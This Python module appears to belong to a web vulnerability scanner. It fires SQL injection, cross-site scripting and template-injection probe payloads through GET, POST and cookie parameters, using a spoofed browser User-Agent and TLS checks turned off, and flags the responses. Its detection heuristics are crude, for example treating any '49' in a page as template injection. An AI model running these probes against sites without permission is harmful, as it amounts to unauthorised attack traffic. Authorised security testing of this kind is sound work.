# exploits/injection_tests.py

import aiohttp
import asyncio
import logging
import re
from typing import List, Dict, Optional, Set
from urllib.parse import urljoin, urlencode
from exploits.parameter_discovery import discover_parameters

SQLI_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' AND 1=1--", "\" AND 1=2--"]
XSS_PAYLOADS = ['<script>alert(1)</script>', '"><svg/onload=alert(1)>', "'><img src=x onerror=alert(1)>"]
SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}"]

DEFAULT_HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/100.0.4896.127 Safari/537.36")
}

def passive_content_checks(html: str) -> List[str]:
    flags = []
    if re.search(r"select|insert|update|delete|union|drop\s", html, re.I):
        flags.append("potential_sqli")
    if re.search(r"<script|onerror=|alert\(", html, re.I):
        flags.append("potential_xss")
    if re.search(r"{{.*?}}|\${.*?}", html):
        flags.append("potential_ssti")
    return flags

async def fetch(session: aiohttp.ClientSession, url: str, proxy: Optional[str] = None) -> Dict:
    try:
        async with session.get(url, headers=DEFAULT_HEADERS, timeout=12, proxy=proxy, ssl=False) as resp:
            text = await resp.text(errors="ignore")
            cookies = {c.key: c.value for c in resp.cookies.values()}
            return {"html": text, "cookies": cookies, "url": str(resp.url)}
    except Exception as e:
        logging.debug(f"[INJECT] Fetch error {url}: {e}")
        return {"html": "", "cookies": {}, "url": url}

async def active_test_param(session: aiohttp.ClientSession, base_url: str, param_name: str, param_value: str, payloads: List[str], 
                            injection_point: str, proxy: Optional[str] = None) -> List[Dict]:
    findings = []
    for payload in payloads:
        test_data = {param_name: payload}
        try:
            if injection_point == "get":
                url = f"{base_url.split('?')[0]}?{urlencode(test_data)}"
                async with session.get(url, headers=DEFAULT_HEADERS, proxy=proxy, ssl=False) as resp:
                    html = await resp.text(errors="ignore")
            elif injection_point == "post":
                async with session.post(base_url, data=test_data, headers=DEFAULT_HEADERS, proxy=proxy, ssl=False) as resp:
                    html = await resp.text(errors="ignore")
            elif injection_point == "cookie":
                async with session.get(base_url, headers=DEFAULT_HEADERS, cookies=test_data, proxy=proxy, ssl=False) as resp:
                    html = await resp.text(errors="ignore")
            else:
                continue
            html_lower = html.lower()

            if any(x in html_lower for x in ["sql", "syntax", "odbc", "mysql", "sqlite", "oracle", "postgres"]):
                vuln_type = "SQL Injection"
            elif payload.lower() in html_lower:
                vuln_type = "XSS"
            elif "49" in html_lower or "34359738368" in html_lower:
                vuln_type = "SSTI"
            else:
                continue

            vuln_suffix = f" ({injection_point})"
            findings.append({
                "url": base_url,
                "vuln": vuln_type + vuln_suffix,
                "param": param_name,
                "payload": payload
            })
            break
        except Exception as e:
            logging.debug(f"[INJECT] Active test error: {e}")
    return findings

async def run_injection_tests(base_url: str, discovered_links: List[str], proxy: Optional[str] = None, fuzz_wordlist: Optional[List[str]] = None) -> Dict[str, List[Dict]]:
    logging.info(f"[INJECT] Starting injection tests on {base_url}")
    results = {"passive": [], "active": []}

    # Step 1: Get parameter discovery results
    param_map = await discover_parameters(base_url, discovered_links, proxy=proxy, fuzz_wordlist=fuzz_wordlist)

    async with aiohttp.ClientSession() as session:
        # Step 2: Passive checks on page content
        for url, params_data in param_map.items():
            fetch_res = await fetch(session, url, proxy=proxy)
            flags = passive_content_checks(fetch_res["html"])
            for flag in flags:
                results["passive"].append({
                    "url": url,
                    "type": flag,
                    "note": "Passive content indication"
                })

        # Step 3: Active injection testing using discovered parameters
        active_tasks = []
        for url, pdata in param_map.items():
            # Test GET params
            for param in pdata.get("get", []):
                active_tasks.append(active_test_param(session, url, param, "", SQLI_PAYLOADS + XSS_PAYLOADS + SSTI_PAYLOADS, "get", proxy))
            # Test POST params (simulate POST on same URL or form action not handled)
            for param in pdata.get("post", []):
                active_tasks.append(active_test_param(session, url, param, "", SQLI_PAYLOADS + XSS_PAYLOADS + SSTI_PAYLOADS, "post", proxy))
            # Test cookies
            for cookie in pdata.get("cookies", []):
                active_tasks.append(active_test_param(session, url, cookie, "", SQLI_PAYLOADS + XSS_PAYLOADS + SSTI_PAYLOADS, "cookie", proxy))

        active_results = await asyncio.gather(*active_tasks, return_exceptions=True)
        for res in active_results:
            if isinstance(res, list) and res:
                results["active"].extend(res)

    logging.info(f"[INJECT] Injection tests completed with {len(results['active'])} active findings")
    return results